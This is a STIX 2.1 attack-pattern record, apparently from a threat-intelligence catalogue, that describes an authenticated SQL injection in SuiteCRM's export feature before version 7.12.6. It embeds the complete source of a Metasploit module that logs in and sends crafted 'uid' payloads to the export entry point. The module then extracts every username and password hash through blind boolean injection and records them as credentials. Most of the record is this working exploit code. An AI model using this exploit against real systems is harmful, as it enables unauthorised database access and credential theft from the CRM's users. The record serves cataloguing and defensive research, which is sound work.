{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9280578f-ee39-44e6-9465-28e998f38a3e",
    "created": "2024-08-14T16:32:31.742944Z",
    "modified": "2024-08-14T16:32:31.742948Z",
    "name": "SuiteCRM authenticated SQL injection in export functionality",
    "description": " This module exploits an authenticated SQL injection in SuiteCRM in versions before 7.12.6. The vulnerability allows an authenticated attacker to send specially crafted requests to the export entry point of the application in order to retrieve all the usernames and their associated password from the database. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/suite_crm_export_sqli.rb",
            "external_id": "suite_crm_export_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://docs.suitecrm.com/admin/releases/7.12.x/#_7_12_6"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::SQLi\n  include Msf::Exploit::Remote::HttpClient\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SuiteCRM authenticated SQL injection in export functionality',\n        'Description' => %q{\n          This module exploits an authenticated SQL injection in SuiteCRM in versions before 7.12.6. The vulnerability\n          allows an authenticated attacker to send specially crafted requests to the export entry point of the application in order\n          to retrieve all the usernames and their associated password from the database.\n        },\n        'Author' => [\n          'Exodus Intelligence', # Advisory\n          'jheysel-r7', # poc + msf module\n          'Redouane NIBOUCHA <rniboucha@yahoo.fr>' # sql injection help\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/'],\n          ['URL', 'https://docs.suitecrm.com/admin/releases/7.12.x/#_7_12_6']\n        ],\n        'Actions' => [\n          ['Dump credentials', { 'Description' => 'Dumps usernames and passwords from the users table' }]\n        ],\n        'DefaultAction' => 'Dump credentials',\n        'DisclosureDate' => '2022-05-24',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Privileged' => true\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),\n      OptString.new('USERNAME', [true, 'Username of user', '']),\n      OptString.new('PASSWORD', [true, 'Password for user', '']),\n    ]\n  end\n\n  def check\n    authenticated = authenticate\n    return Exploit::CheckCode::Safe('Unable to authenticate to SuiteCRM') unless authenticated\n\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'module' => 'Home',\n          'action' => 'About'\n        }\n      }\n    )\n\n    return Exploit::CheckCode::Safe('Trying to query the SuiteCRM version information failed') unless res&.body\n\n    version = Rex::Version.new(res.body.match(/Version\\s+((?:\\d+\\.)+\\d+).*/)[1])\n    return Exploit::CheckCode::Safe('Could not find retrieve the version of SuiteCRM from the version page') unless version\n\n    print_status \"Version detected: #{version}\"\n\n    return Exploit::CheckCode::Vulnerable if version <= Rex::Version.new('7.12.5')\n\n    Exploit::CheckCode::Safe\n  end\n\n  def authenticate\n    print_status(\"Authenticating as #{datastore['USERNAME']}\")\n    initial_req = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'module' => 'Users',\n          'action' => 'Login'\n        }\n      }\n    )\n\n    return false unless initial_req && initial_req.code == 200 && initial_req.body.include?('SuiteCRM') && initial_req.get_cookies.include?('sugar_user_theme=')\n\n    login = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_post' => {\n          'module' => 'Users',\n          'action' => 'Authenticate',\n          'return_module' => 'Users',\n          'return_action' => 'Login',\n          'user_name' => datastore['USERNAME'],\n          'username_password' => datastore['PASSWORD'],\n          'Login' => 'Log In'\n        }\n      }\n    )\n\n    return false unless login && login.code == 302 && login.headers['Location'] == 'index.php?module=Home&action=index' && login.get_cookies.include?('sugar_user_theme=')\n\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'module' => 'Administration',\n          'action' => 'index'\n        }\n      }\n    )\n\n    if res && res.code == 200 && res.body.include?('SuiteCRM') && res.get_cookies.include?('sugar_user_theme=') && res.body.include?('SUGAR.unifiedSearchAdvanced')\n      print_good(\"Authenticated as: #{datastore['USERNAME']}\")\n      true\n    else\n      print_error(\"Failed to authenticate as: #{datastore['USERNAME']}\")\n      false\n    end\n  end\n\n  # This module sends this same request multiple times. In order to reduce code it has beed moved it into it's owm method\n  def send_injection_request_cgi(payload)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),\n      'encode_params' => false,\n      'vars_post' => {\n        'uid' => payload,\n        'module' => 'Accounts',\n        'action' => 'index'\n      }\n    })\n\n    if res&.code != 200\n      fail_with(Failure::UnexpectedReply, \"The server did not respond to the request with the payload: #{payload}\")\n    end\n    res\n  end\n\n  # @return an array of usernames\n  def get_user_names(sqli)\n    print_status 'Fetching Users, please wait...'\n    users = sqli.run_sql('select group_concat(DISTINCT user_name) from users')\n    users.split(',')\n  end\n\n  # Use blind boolean SQL injection to determine the user_hashes of given usernames\n  def get_user_hashes(sqli, users)\n    print_status 'Fetching Hashes, please wait...'\n    hashes = []\n    number_of_users = users.size\n    users.each_with_index do |username, index|\n      hash = sqli.run_sql(\"select user_hash from users where user_name='#{username}'\")\n      hashes << [username, hash]\n      print_good \"(#{index + 1}/#{number_of_users}) Username : #{username} ; Hash : #{hash}\"\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: username,\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),\n        private_data: hash,\n        service_name: 'SuiteCRM',\n        address: datastore['RHOSTS'],\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n    end\n    hashes\n  end\n\n  def init_sqli\n    wrong_resp_length = send_injection_request_cgi(',\\\\,))+AND+1=2;+--+')&.body&.length\n    fail_with(Failure::UnexpectedReply, 'The server responded unexpectedly to a request sent with uid: \",\\\\,))+AND+1=2;+--+\"') unless wrong_resp_length\n    sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|\n      fail_with(Failure::BadConfig, 'comma in payload') if payload.include?(',')\n      resp_length = send_injection_request_cgi(\",\\\\,))+OR+(#{payload});+--+\")&.body&.length\n      resp_length != wrong_resp_length\n    end\n\n    # redefine blind_detect_length and blind_dump_data because of the bad characters the payload cannot include\n\n    def sqli.blind_detect_length(query, _timebased)\n      output_length = 0\n      min_length = 0\n      max_length = 800\n      loop do\n        break if blind_request(\"length(cast((#{query}) as binary))=#{output_length}\")\n\n        flag = blind_request(\"length(cast((#{query}) as binary))+BETWEEN+#{output_length}+AND+#{max_length}\")\n        if flag\n          min_length = output_length + 1\n          if max_length - min_length <= 1\n            if blind_request(\"length(cast((#{query}) as binary))=#{min_length}\")\n              output_length = min_length\n              break\n            elsif blind_request(\"length(cast((#{query}) as binary))=#{max_length}\")\n              output_length = max_length\n              break\n            else\n              fail_with(Failure::UnexpectedReply, 'Somehow this got messed up!')\n            end\n          end\n          output_length = (min_length + max_length) / 2 + 1\n        else\n          max_length = output_length\n          output_length = (min_length + max_length) / 2 - 1\n        end\n      end\n      output_length\n    end\n\n    def sqli.blind_dump_data(query, length, _known_bits, _bits_to_guess, _timebased)\n      output = [ ]\n      position = 1\n      length.times do |_j|\n        character_value = 0\n        min_value = 0\n        max_value = 1000\n        loop do\n          break if blind_request(\"(select ascii(substr((#{query}) from #{position} for 1)))=#{character_value}\")\n\n          flag = blind_request(\"(select ascii(substr((#{query}) from #{position} for 1)))+BETWEEN+#{character_value}+AND+#{max_value}\")\n          if flag\n            min_value = character_value + 1\n            if max_value - min_value <= 1\n              if blind_request(\"(select ascii(substr((#{query}) from #{position} for 1)))=#{min_value}\")\n                character_value = min_value\n                break\n              elsif blind_request(\"(select ascii(substr((#{query}) from #{position} for 1)))=#{max_value}\")\n                character_value = max_value\n                break\n              else\n                fail_with(Failure::UnexpectedReply, 'Somehow this got messed up!')\n              end\n            end\n            character_value = (min_value + max_value) / 2 + 1\n          else\n            max_value = character_value\n            character_value = (min_value + max_value) / 2 - 1\n          end\n        end\n\n        position += 1\n        output << character_value\n      end\n      output.map(&:chr).join\n    end\n\n    sqli\n  end\n\n  def run\n    unless datastore['AutoCheck']\n      authenticated = authenticate\n      fail_with(Failure::NoAccess, 'Unable to authenticate to SuiteCRM') unless authenticated\n    end\n\n    sqli = init_sqli\n    users = get_user_names(sqli)\n\n    user_table = Rex::Text::Table.new(\n      'Header' => 'SuiteCRM User Names',\n      'Indent' => 1,\n      'Columns' => ['Username']\n    )\n\n    users.each do |user|\n      user_table << [user]\n    end\n\n    print_line user_table.to_s\n    creds = get_user_hashes(sqli, users)\n    creds_table = Rex::Text::Table.new(\n      'Header' => 'SuiteCRM User Credentials',\n      'Indent' => 1,\n      'Columns' => ['Username', 'Hash']\n    )\n\n    creds.each do |cred|\n      creds_table << [cred[0], cred[1]]\n    end\n    print_line creds_table.to_s\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-24"
}